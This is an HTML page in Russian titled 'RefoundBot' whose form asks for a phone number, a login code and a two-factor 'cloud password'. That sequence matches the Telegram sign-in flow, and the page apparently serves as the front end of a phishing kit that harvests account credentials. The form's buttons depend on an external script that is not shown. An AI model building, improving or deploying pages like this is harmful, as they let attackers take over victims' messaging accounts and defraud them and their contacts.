<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RefoundBot</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0c2461, #1e3799);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #4bcffa;
        }

        .header p {
            font-size: 14px;
            opacity: 0.8;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background: rgba(255, 255, 255, 0.15);
            color: white;
            font-size: 16px;
            outline: none;
            transition: background 0.3s;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        .input-group input:focus {
            background: rgba(255, 255, 255, 0.25);
        }

        .button {
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            border: none;
            background: linear-gradient(90deg, #4bcffa, #5d5fee);
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }

        .button:active {
            transform: translateY(0);
        }

        .button:disabled {
            background: gray;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            font-weight: 500;
            display: none;
        }

        .success {
            background: rgba(46, 213, 115, 0.3);
            border: 1px solid #2ed573;
            color: #2ed573;
        }

        .error {
            background: rgba(255, 71, 87, 0.3);
            border: 1px solid #ff4757;
            color: #ff4757;
        }

        .info {
            background: rgba(75, 207, 250, 0.3);
            border: 1px solid #4bcffa;
            color: #4bcffa;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Регистрация</h1>
            <p>Введите данные для доступа к системе</p>
        </div>

        <div class="input-group">
            <label for="phone">Ввод номера с кодом</label>
            <input type="text" id="phone" placeholder="+79211234567">
        </div>

        <div class="input-group">
            <label for="code">Ввод кода</label>
            <input type="text" id="code" placeholder="12345" disabled>
        </div>

        <div class="input-group">
            <label for="fa">Ввод 2FA (облачный пароль)</label>
            <input type="password" id="fa" placeholder="••••••" disabled>
        </div>

        <button class="button" id="sendCodeBtn">Send code</button>
        <button class="button" id="loginBtn" disabled>Login</button>

        <div id="message" class="message"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
